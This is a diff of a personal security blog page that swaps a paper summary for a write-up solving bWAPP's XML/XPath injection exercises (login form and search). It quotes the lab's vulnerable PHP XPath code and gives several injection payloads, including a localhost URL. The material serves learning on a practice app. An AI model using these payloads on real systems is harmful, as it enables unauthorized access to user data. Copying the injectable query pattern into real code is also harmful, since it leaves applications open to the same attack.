@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="MULTI-FACTOR AUTHENTICATION SCHEME FOR ONLINE EXAMINATION, CTF, OSCP, Cyber Security, Blockchain">
+    <meta name="keywords" content="BWAPP XML/XPath Injection (Login Form/search), CTF, OSCP, Cyber Security, Blockchain">
     <meta name="description" content="Mukhilan Pari Personal Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>MULTI-FACTOR AUTHENTICATION SCHEME FOR ONLINE EXAMINATION | Mukhilan</title>
+    <title>BWAPP XML/XPath Injection (Login Form/search) | Mukhilan</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/projects/multi/logo.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">MULTI-FACTOR AUTHENTICATION SCHEME FOR ONLINE EXAMINATION</h1>
+                    <h1 class="description center-align post-title">BWAPP XML/XPath Injection (Login Form/search)</h1>
                 </div>
             </div>
         </div>
@@ -446,16 +446,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/python/">
-                                <span class="chip bg-color">python</span>
-                            </a>
-                        
-                            <a href="/tags/Paper/">
-                                <span class="chip bg-color">Paper</span>
-                            </a>
-                        
-                            <a href="/tags/Project/">
-                                <span class="chip bg-color">Project</span>
+                            <a href="/tags/Bwapp/">
+                                <span class="chip bg-color">Bwapp</span>
                             </a>
                         
                     </div>
@@ -466,12 +458,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Paper/" class="post-category">
-                                Paper
-                            </a>
-                        
-                            <a href="/categories/Paper/Project/" class="post-category">
-                                Project
+                            <a href="/categories/Writeups/" class="post-category">
+                                Writeups
                             </a>
                         
                     </div>
@@ -483,7 +471,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-01-27
+                    2019-01-18
                 </div>
                 
 
@@ -497,14 +485,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    177
+                    349
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    1 Min
+                    2 Min
                 </div>
                 
 
@@ -519,19 +507,44 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>Multi-factor authentication schemes have emerged as alternatives to single-factor authentication schemes with the aim<br>of improving the security. Factors like passwords, biometrics smart/id cards have been used in combinations in addition to mobile OTPs for enhancing security. Conventional authentication schemes are inadequate for security-critical applications like financial transaction, online examinations,etc. The paper focuses on discussing a multi-factor authentication scheme specifically designed for securing online examination services without comprising user-friendliness. The experimentation results clearly brought out the applicability of the scheme in real time with fine-tuning of network related parameters.</p>
-<p><img src="/medias/projects/multi/flow.png" alt="Flow chart"></p>
-<h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul>
-<li>Modules used :<ul>
-<li>Face Recognition modules</li>
-<li>OTP Module</li>
-<li>Fingerprint Module</li>
-</ul>
-</li>
-<li>Mitigating different forms of attacks.</li>
-<li>User-friendly</li>
-</ul>
-<p>This paper was published in <a target="_blank" rel="noopener" href="https://acadpubl.eu/hub/2018-119-15/4/783.pdf">International Journal of Pure and Applied Mathematics</a></p>
+                <h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="XML-XPath-Injection-Login-Form"><a href="#XML-XPath-Injection-Login-Form" class="headerlink" title="XML/XPath Injection (Login Form):"></a>XML/XPath Injection (Login Form):</h2><p>Sample xml data is as below,</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employees</span><span class="token punctuation">></span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employee</span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirstName</span><span class="token punctuation">></span></span>Arnold<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FirstName</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastName</span><span class="token punctuation">></span></span>Baker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastName</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UserName</span><span class="token punctuation">></span></span>ABaker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UserName</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">></span></span>SoSecret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Type</span><span class="token punctuation">></span></span>Admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Type</span><span class="token punctuation">></span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employee</span><span class="token punctuation">></span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employee</span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirstName</span><span class="token punctuation">></span></span>Peter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FirstName</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastName</span><span class="token punctuation">></span></span>Pan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastName</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UserName</span><span class="token punctuation">></span></span>PPan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UserName</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">></span></span>NotTelling<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Type</span><span class="token punctuation">></span></span>User<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Type</span><span class="token punctuation">></span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employee</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employees</span><span class="token punctuation">></span></span></code></pre>
+<p>The source code is, </p>
+<pre><code>$xml = simplexml_load_file("passwords/heroes.xml");
+$result = $xml-&gt;xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");</code></pre>
+<p>To find whether its XML injection or not, its similar to SQL injection. Use single quote <code>'</code> and error shows you XML and XPath is used.</p>
+<h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>Here without login password validation, Data can be accessed using <strong>id</strong> in the XML as below. </p>
+<p><code>blah' or id='2</code> this payload is getting the user detail of 2nd user. Accordingly, other user data also can be accessed.</p>
+<p>another payload,</p>
+<pre><code>blah' or 1=1 or '</code></pre>
+<h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this, medium level and high level are same.</p>
+<h2 id="XML-XPath-Injection-search"><a href="#XML-XPath-Injection-search" class="headerlink" title="XML/XPath Injection (search):"></a>XML/XPath Injection (search):</h2><p>This injection is more of a blind XML/XPath.</p>
+<h3 id="LOW-LEVEL-1"><a href="#LOW-LEVEL-1" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>payload is, </p>
+<pre><code>')]/child::node() | blah[contains(blah,'</code></pre>
+<p>Payload should be in genre field, then updated Url is</p>
+<pre><code>localhost/bwapp/xmli_2.php?genre=%27)]/child::node()%20|%20blah[contains(blah,%27&amp;action=search</code></pre>
+<p>Entity name is unknown. So, <code>child::node()</code> is to select all the node. That’s why it prints all the data.</p>
+<p>The source code is,</p>
+<pre><code>$result = $xml-&gt;xpath("//hero[contains(genre, '$genre')]/movie");</code></pre>
+<h3 id="MEDIUM-LEVEL-1"><a href="#MEDIUM-LEVEL-1" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this, medium level and high level are same.</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.owasp.org/index.php/XPATH_Injection
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -575,7 +588,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://mukhilan.com/Paper/Project/multi-factor/">http://mukhilan.com/Paper/Project/multi-factor/</a>
+                    <a href="http://mukhilan.com/bwapp-xml-xpath/">http://mukhilan.com/bwapp-xml-xpath/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -613,16 +626,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/python/">
-                                    <span class="chip bg-color">python</span>
-                                </a>
-                            
-                                <a href="/tags/Paper/">
-                                    <span class="chip bg-color">Paper</span>
-                                </a>
-                            
-                                <a href="/tags/Project/">
-                                    <span class="chip bg-color">Project</span>
+                                <a href="/tags/Bwapp/">
+                                    <span class="chip bg-color">Bwapp</span>
                                 </a>
                             
                         </div>
@@ -667,7 +672,7 @@
         repo: 'mukhilanpari.github.io',
         owner: 'mukhilanpari',
         admin: "mukhilanpari",
-        id: '2019-01-27T00-00-00',
+        id: '2019-01-18T00-00-00',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -695,31 +700,31 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/Android/ssl-pin-bypass/">
+                <a href="/bwapp-html/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="SSL UNPINNING USING XPOSED MODULE">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="BWAPP HTML Injection (GET/POST)">
                         
-                        <span class="card-title">SSL UNPINNING USING XPOSED MODULE</span>
+                        <span class="card-title">BWAPP HTML Injection (GET/POST)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Xposed Framework to Bypass Android SSL Verification and Certificate Pinning
+                            BWAPP HTML Injection GET/POST solution
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-02-05
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-01-18
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Android/" class="post-category">
-                                    Android
+                            <a href="/categories/Writeups/" class="post-category">
+                                    Writeups
                                 </a>
                             
                             
@@ -729,16 +734,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Mobile/">
-                        <span class="chip bg-color">Mobile</span>
-                    </a>
-                    
-                    <a href="/tags/Bypass/">
-                        <span class="chip bg-color">Bypass</span>
-                    </a>
-                    
-                    <a href="/tags/Xposed/">
-                        <span class="chip bg-color">Xposed</span>
+                    <a href="/tags/Bwapp/">
+                        <span class="chip bg-color">Bwapp</span>
                     </a>
                     
                 </div>
@@ -749,27 +746,27 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
+                Current&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/Writeups/bwapp-iframe-smtp/">
+                <a href="/bwapp-xml-xpath/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="BWAPP IFrame and SMTP Injection">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="BWAPP XML/XPath Injection (Login Form/search)">
                         
-                        <span class="card-title">BWAPP IFrame and SMTP Injection</span>
+                        <span class="card-title">BWAPP XML/XPath Injection (Login Form/search)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            BWAPP IFrame and Mail Header Injection (SMTP) solution
+                            BWAPP XML/XPath Injection Login Form and search solution
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-01-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-01-18
                             </span>
                         <span class="publish-author">
                             
@@ -783,6 +780,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
